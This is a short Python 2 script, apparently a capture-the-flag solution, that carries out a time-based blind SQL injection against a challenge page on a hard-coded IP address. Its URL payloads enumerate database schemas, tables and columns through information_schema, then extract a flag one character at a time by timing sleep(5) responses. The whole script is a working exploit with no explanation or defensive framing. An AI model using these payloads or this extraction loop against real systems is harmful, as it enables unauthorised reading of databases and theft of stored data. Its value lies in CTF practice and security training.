#-*- coding: UTF-8 -*-
import requests
import string

url0 = "http://39.108.52.84:9000/Challenge1/index.php?id='||if((mid((select distinct table_schema from information_schema.tables limit %d,1),%d,1)='%s'),sleep(5),1)--+"
url1 = "http://39.108.52.84:9000/Challenge1/index.php?id='||if((mid((select distinct table_name from information_schema.tables where table_schema='security' limit %d,1),%d,1)='%s'),sleep(5),1)--+"
url2 = "http://39.108.52.84:9000/Challenge1/index.php?id='||if((mid((select column_name from information_schema.columns where table_name='flagishere' limit %d,1),%d,1)='%s'),sleep(5),1)--+"
url3 = "http://39.108.52.84:9000/Challenge1/index.php?id='||if((mid((select flag from flagishere limit %d,1),%d,1)='%s'),sleep(5),1)--+"
guess = string.lowercase + string.uppercase + string.digits + string.punctuation
all_results = []

for result_number in range(0,100):  	
	result=''
	for i in range(1,100):           	
		flag = 0
		for str1 in guess:				
			print "trying ",str1
			#url = url0%(result_number,i,str1)
			#url = url1%(result_number,i,str1)
			#url = url2%(result_number,i,str1)
			url = url3%(result_number,i,str1)
			try:
				res=requests.get(url,timeout=4)
			except:
				result += str1
				flag = 1
				print "scanning on the %d place,the result now is %s"%(result_number,result)
				break
		if flag == 0:
			break;
	all_results.append(result)
	if i==1 and flag==0:
		print "scan finished"
		break
		
for i in range(len(all_results)):
	print all_results[i]
